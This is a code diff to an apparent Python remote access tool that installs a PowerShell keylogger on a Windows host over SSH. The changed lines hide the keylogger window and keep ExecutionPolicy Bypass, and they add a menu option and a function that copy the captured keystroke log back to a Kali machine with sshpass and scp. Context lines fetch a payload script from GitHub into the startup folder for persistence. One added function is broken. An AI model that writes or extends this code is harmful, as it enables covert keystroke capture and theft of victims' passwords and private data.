@@ -10,6 +10,7 @@ import getpass
 from modules import *
 from paramiko import SSHClient
 import random as r
+import subprocess
 
 
 
@@ -44,6 +45,7 @@ options_menu = """
         Payloads:
             [0] Remote Console
             [1] Keylogger
+            [2] Get Keylogger Logs
 
 """
 
@@ -113,7 +115,7 @@ def keylogger(address, target_password, startup_dir, working_dir):
 
     
     controller_command = f'curl -L https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/c.cmd -o "{startup_dir}/c.cmd"'
-    execute_keylogger = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& \\"{working_dir}/keylogger.ps1\\""'
+    execute_keylogger = f'powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command "& \\"{working_dir}/keylogger.ps1\\""'
     print("[+] Keylogger Prepped")
 
     print("[*] Installing keylogger...")
@@ -127,15 +129,28 @@ def keylogger(address, target_password, startup_dir, working_dir):
     print("\n [*] Executing Keylogger")
     remote_commands(address, target_password,execute_keylogger)
 
-
-
-
+def new_start():
+    sys.exit()
+    cls
+    print(banner)
+    print(options_menu)
 
 
 #terminate programe
 def exit():
     sys.exit()
 
+
+
+def get_keylogger(address, password, working_dir):
+    local_path = "/home/kali/Downloads/"
+    remote = "C:/Users/lukee/AppData/Local/Temp/lukee.log"
+    command = f'sshpass -p "{password}" scp rat@{address}:{remote} {local_path}'
+
+
+    subprocess.run(command, shell=True, check=True)
+
+    
 #Command Line interface
 def cli(arguments):
     #DISPLAY BANNER
@@ -162,6 +177,9 @@ def cli(arguments):
 
         elif option == "1":
             keylogger(address, target_password, startup_dir, working_dir)
+
+        elif option =="2":
+            get_keylogger(address, target_password, working_dir)
 
 
 
